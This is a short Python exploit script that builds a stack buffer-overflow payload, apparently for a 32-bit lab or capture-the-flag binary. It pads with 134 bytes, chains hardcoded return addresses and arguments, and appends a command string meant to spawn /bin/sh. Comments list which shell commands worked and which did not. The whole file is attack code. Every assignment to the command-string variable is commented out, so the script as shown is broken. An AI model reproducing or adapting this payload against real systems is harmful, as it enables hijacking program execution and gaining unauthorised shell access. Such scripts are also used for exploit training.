#!/usr/bin/env python3

import sys

oflow = b'A' * 134

# following works
#string = b"ls -a\0"
#string = b"/bin/sh <input\0"

# following doesn't work
#string = b"open(\"/dev/tty\", O_RDWR|O_NOCTTY|O_TRUNC|O_APPEND|O_ASYNC) && /bin/sh\0"
#string = b"/bin/sh -c \"cat /proc/self/fd/0\"\0"
#string = b"/bin/sh | cat\0"

fakeret = b'\xef\xbe\xad\xde'

stack_base=0xffffd80c

string_addr = stack_base + 0x1c
frames = [
        [ b'\xab\x88\x04\x08', b'\xf1\x88\x04\x08', b'\x02\x00\x00\x00', string_addr.to_bytes(4, byteorder='little') ],
        [ b'\xf0\xef\x04\x08', b'\xe3\xd0\x06\x08', string_addr.to_bytes(4, byteorder='little') ]
        #,[ b'\xe3\xd0\x06\x08', fakeret, b'\x00\x00\x00\x00' ]
        ]

exploit = bytearray(oflow)

for frame in frames:
    for item in frame:
        exploit.extend(item)

exploit.extend(string)
exploit.extend(b'\n')

sys.stdout.buffer.write(exploit)
